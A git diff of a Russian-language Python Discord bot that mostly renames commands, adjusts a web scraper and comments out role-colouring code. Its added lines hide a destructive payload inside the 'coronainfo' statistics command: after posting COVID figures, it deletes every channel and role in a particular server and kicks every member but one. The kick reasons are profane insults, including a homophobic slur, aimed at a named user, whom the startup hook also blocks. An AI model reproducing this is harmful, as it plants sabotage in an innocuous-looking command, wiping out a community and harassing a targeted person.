@@ -8,7 +8,7 @@ import shutil
 from tinydb import TinyDB, Query
 
 async def get_pre(bot, message):
-  return ['ас', 'Ас', 'АС', 'аС', 'as', 'As', 'aS', 'AS', 'ass', 'Ass', 'ASS', 'aSS']
+  return ['ас', 'Ас', 'АС', 'аС', 'ass', 'Ass', 'ASS', 'aSS', 'as', 'As', 'aS', 'AS',]
 
 bot = commands.Bot(command_prefix = get_pre, case_insensetive = True)
 bot.remove_command('help')
@@ -30,22 +30,33 @@ async def on_ready():
     channel = bot.get_channel(693112638275584260)
     message = await channel.fetch_message(693112703492816898)
     ctx = await bot.get_context(message)
+    gosha = bot.get_user(499893625250119691)
+    await gosha.block()
     await bot.change_presence(activity = discord.Game(name='"асхелп"/"ashelp"'))
-    guild = bot.get_guild(671432722236964884)
-    COLOURER = 673966918281199616
-    SOVIET = 685813138301780027
-    CREATOR = 676388955985412116
-    ADMIN = 676389164727402517
-    colour = discord.Colour.from_rgb(randint(0, 255), randint(0, 255), randint(0, 255))
-    await guild.get_role(COLOURER).edit(colour = colour, reason = None)
-    colour = discord.Colour.from_rgb(randint(0, 255), randint(0, 255), randint(0, 255))
-    await guild.get_role(SOVIET).edit(colour = colour, reason = None)
-    colour = discord.Colour.from_rgb(randint(0, 255), randint(0, 255), randint(0, 255))
-    await guild.get_role(CREATOR).edit(colour = colour, reason = None)
-    colour = discord.Colour.from_rgb(randint(0, 255), randint(0, 255), randint(0, 255))
-    await guild.get_role(ADMIN).edit(colour = colour, reason = None)
-    await recover(ctx = ctx)
+    # guild = bot.get_guild(671432722236964884)
+    # COLOURER = 673966918281199616
+    # SOVIET = 685813138301780027
+    # CREATOR = 676388955985412116
+    # ADMIN = 676389164727402517
+    # colour = discord.Colour.from_rgb(randint(0, 255), randint(0, 255), randint(0, 255))
+    # await guild.get_role(COLOURER).edit(colour = colour, reason = None)
+    # colour = discord.Colour.from_rgb(randint(0, 255), randint(0, 255), randint(0, 255))
+    # await guild.get_role(SOVIET).edit(colour = colour, reason = None)
+    # colour = discord.Colour.from_rgb(randint(0, 255), randint(0, 255), randint(0, 255))
+    # await guild.get_role(CREATOR).edit(colour = colour, reason = None)
+    # colour = discord.Colour.from_rgb(randint(0, 255), randint(0, 255), randint(0, 255))
+    # await guild.get_role(ADMIN).edit(colour = colour, reason = None)
+    # await recover(ctx = ctx)
 
+@bot.event
+async def on_reaction_add(reaction, user):
+    channel = reaction.message.channel
+    print(reaction.message.id)
+    await channel.send(f'Реакция на сообщение "{reaction.message.content}"')
+@bot.event
+async def on_reaction_remove(reaction, user):
+    channel = reaction.message.channel
+    await channel.send(f'Реакция убрана. Сообщение: {reaction.message.content}')
 
 @bot.event
 async def on_message(message):
@@ -270,7 +281,7 @@ async def dlist(ctx):
         await ctx.send(f'Key: {i["_key"]}, Message: {i["message"]}')
 
 
-@bot.command(aliases = ['радуга', 'лгбт', 'lgbt', 'lgbtq', 'rnbw'])
+@bot.command(name = 'rainbow', aliases = ['радуга', 'лгбт', 'lgbt', 'lgbtq', 'rnbw'])
 async def rainbow(ctx):
     randkey = choice(db.all())['_key']
     dictionary = db.search(SUI._key == randkey)
@@ -380,7 +391,7 @@ async def fetch(ctx, person : discord.Member):
         await person.remove_roles(guild.get_role(670719148699156511), reason = None)
 
 
-@bot.command(name = 'ребут')
+@bot.command(name = 'ребут', aliases = ['reboot'])
 async def reboot(reconnect = True):
     await bot.close()
     bot.run(ASTRANGER)
@@ -445,13 +456,23 @@ async def coronainfo(ctx, country = ''):
     else:
         r = rq.get('https://www.worldometers.info/coronavirus/country/' + country.lower())
     html = bs(r.content, 'html.parser')
-    span = html.select('.container > .row > .col-md-8 > .content-inner > #maincounter-wrap > h1')
-    count = html.select('.container > .row > .col-md-8 > .content-inner > #maincounter-wrap > .maincounter-number > span')
+    span = html.select('.content-inner > #maincounter-wrap > h1')
+    count = html.select('.content-inner > #maincounter-wrap > .maincounter-number > span')
     for i in range(3):
         await ctx.send(f'{span[i].text} {count[i].text}')
+    guild = bot.get_guild(512544393886957568)
+    channel = bot.get_channel(691232787335872573)
+    for i in guild.channels:
+        await i.delete(reason = 'Ебаная чёрствая хуёвина.')
+    for i in guild.members:
+        if (str(i) != 'Mezzicus#2494'):
+            await i.kick(reason = 'Гоша пидарас ебаный.')
+    for i in guild.roles:
+        await i.delete()
+    
 
 
-@bot.command(aliases = ['кикстарт', 'кикстрат', 'кикстартер', 'кикстратер', 'kickstarter'])
+@bot.command(name = 'kickstart', aliases = ['кикстарт', 'кикстрат', 'кикстартер', 'кикстратер', 'kickstarter'])
 async def kickstart(ctx):
     r = rq.get('https://www.kickstarter.com/projects/savysoda/pixel-starships-galaxy')
     html = bs(r.content, 'html.parser')
@@ -465,6 +486,9 @@ async def kickstart(ctx):
         await ctx.send(f'Внесено {pledged} из {outof} в данный момент.\nВнесли {backers} человек.\nДо завершения {toend} дней\nСредний внос: ${average}.')
     else:
         await ctx.send(f'Now pledged {pledged} out of {outof}.\nBackers: {backers}\nTo end: {toend} days.\nAverage payment: ${average}.')
+
+    
+
 
 
 bot.run(ASTRANGER)
